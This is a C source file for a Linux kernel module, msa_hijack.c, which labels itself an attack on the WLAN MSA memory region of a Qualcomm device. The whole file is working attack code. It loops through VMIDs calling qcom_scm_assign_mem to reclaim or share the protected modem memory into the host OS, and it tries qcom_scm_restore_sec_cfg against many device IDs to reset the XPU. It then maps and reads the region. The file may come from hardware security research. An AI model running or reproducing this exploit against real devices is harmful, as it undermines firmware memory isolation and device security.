/*
 * msa_hijack.c - Attempt TOCTOU attack on WLAN MSA memory
 *
 * Attack vectors:
 * 1. qcom_scm_assign_mem() - reclaim MSA from MSS to HLOS
 * 2. qcom_scm_assign_mem() - share MSA between HLOS and MSS
 * 3. qcom_scm_restore_sec_cfg() - try to reset WLAN XPU
 *
 * Parameters:
 *   attack=0: Reclaim MSA from MSS to HLOS
 *   attack=1: Share MSA between HLOS and MSS (dual ownership)
 *   attack=2: Try qcom_scm_restore_sec_cfg with various device IDs
 *   attack=3: Read MSA to verify current state (safe test)
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/io.h>
#include <linux/qcom_scm.h>
#include <linux/delay.h>

MODULE_LICENSE("GPL");

static int attack = 3;
module_param(attack, int, 0);
MODULE_PARM_DESC(attack, "Attack mode (0=reclaim, 1=share, 2=sec_cfg, 3=read)");

/* MSA memory region from device tree */
#define MSA_PA      0x8b500000ULL
#define MSA_SIZE    0x200000    /* 2MB */

/* VMID definitions */
#define VMID_HLOS       0x3
#define VMID_MSS_MSA    0xF

/* Permission flags */
#define PERM_READ   0x4
#define PERM_WRITE  0x2
#define PERM_EXEC   0x1
#define PERM_RW     (PERM_READ | PERM_WRITE)
#define PERM_RWX    (PERM_RW | PERM_EXEC)

static int try_reclaim_msa(void)
{
    struct qcom_scm_vmperm next;
    unsigned int srcvm;
    int ret;
    int vmids[] = {VMID_MSS_MSA, VMID_HLOS, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
    int i;

    pr_info("msa_hijack: Attempting to reclaim MSA, trying multiple srcvm values\n");
    pr_info("msa_hijack: MSA PA=0x%llx size=0x%x\n", MSA_PA, MSA_SIZE);

    for (i = 0; i < sizeof(vmids)/sizeof(vmids[0]); i++) {
        srcvm = BIT(vmids[i]);
        next.vmid = VMID_HLOS;
        next.perm = PERM_RWX;

        ret = qcom_scm_assign_mem(MSA_PA, MSA_SIZE, &srcvm, &next, 1);
        pr_info("msa_hijack: assign_mem(srcvm=BIT(%d)=0x%x->HLOS) = %d\n",
                vmids[i], BIT(vmids[i]), ret);

        if (ret == 0) {
            pr_info("msa_hijack: *** SUCCESS with srcvm BIT(%d)! ***\n", vmids[i]);
            break;
        }
    }

    /* Also try sharing with different srcvm */
    pr_info("msa_hijack: Now trying shared ownership with different srcvm\n");
    for (i = 0; i < sizeof(vmids)/sizeof(vmids[0]); i++) {
        struct qcom_scm_vmperm next2[2];
        srcvm = BIT(vmids[i]);
        next2[0].vmid = VMID_HLOS;
        next2[0].perm = PERM_RW;
        next2[1].vmid = vmids[i];
        next2[1].perm = PERM_RW;

        if (vmids[i] == VMID_HLOS) continue; /* skip self-share */

        ret = qcom_scm_assign_mem(MSA_PA, MSA_SIZE, &srcvm, next2, 2);
        pr_info("msa_hijack: share(srcvm=BIT(%d)->HLOS+%d) = %d\n",
                vmids[i], vmids[i], ret);

        if (ret == 0) {
            pr_info("msa_hijack: *** SHARE SUCCESS with srcvm BIT(%d)! ***\n", vmids[i]);
            break;
        }
    }

    return ret;
}

static int try_share_msa(void)
{
    struct qcom_scm_vmperm next[2];
    unsigned int srcvm;
    int ret;

    pr_info("msa_hijack: Attempting to share MSA between HLOS and MSS\n");

    /* Try claiming from MSS_MSA */
    srcvm = BIT(VMID_MSS_MSA);
    next[0].vmid = VMID_HLOS;
    next[0].perm = PERM_RW;
    next[1].vmid = VMID_MSS_MSA;
    next[1].perm = PERM_RW;

    ret = qcom_scm_assign_mem(MSA_PA, MSA_SIZE, &srcvm, next, 2);
    pr_info("msa_hijack: assign_mem(MSS->HLOS+MSS share) returned %d\n", ret);

    if (ret == 0) {
        pr_info("msa_hijack: *** MSA SHARED! ***\n");
        void __iomem *msa = ioremap_wc(MSA_PA, MSA_SIZE);
        if (msa) {
            u32 val = readl(msa);
            pr_info("msa_hijack: MSA[0] = 0x%08x\n", val);
            iounmap(msa);
        }
    }

    return ret;
}

static int try_restore_sec_cfg(void)
{
    int ret;
    int dev_ids[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 15, 18, 19, 20, 0x1e};
    int i;

    pr_info("msa_hijack: Trying qcom_scm_restore_sec_cfg with various device IDs\n");

    for (i = 0; i < sizeof(dev_ids)/sizeof(dev_ids[0]); i++) {
        ret = qcom_scm_restore_sec_cfg(dev_ids[i], 0);
        if (ret == 0) {
            pr_info("msa_hijack: restore_sec_cfg(dev=%d, spare=0) = SUCCESS!\n", dev_ids[i]);
        } else {
            pr_info("msa_hijack: restore_sec_cfg(dev=%d) = %d\n", dev_ids[i], ret);
        }
    }

    return 0;
}

static int try_read_msa(void)
{
    void __iomem *msa;
    u32 val;
    int i;

    pr_info("msa_hijack: Reading MSA to verify current state\n");

    msa = ioremap_wc(MSA_PA, 0x1000);
    if (!msa) {
        pr_err("msa_hijack: ioremap failed\n");
        return -ENOMEM;
    }

    for (i = 0; i < 0x40; i += 4) {
        val = readl(msa + i);
        if (val != 0 || i < 0x10) {
            pr_info("msa_hijack: MSA+0x%03x = 0x%08x\n", i, val);
        }
    }

    iounmap(msa);
    return 0;
}

static int __init msa_hijack_init(void)
{
    int ret = 0;

    pr_info("msa_hijack: loaded, attack mode=%d\n", attack);

    switch (attack) {
    case 0:
        ret = try_reclaim_msa();
        break;
    case 1:
        ret = try_share_msa();
        break;
    case 2:
        ret = try_restore_sec_cfg();
        break;
    case 3:
        ret = try_read_msa();
        break;
    default:
        pr_err("msa_hijack: unknown attack mode %d\n", attack);
        break;
    }

    return -EAGAIN; /* Don't stay loaded */
}

static void __exit msa_hijack_exit(void)
{
}

module_init(msa_hijack_init);
module_exit(msa_hijack_exit);
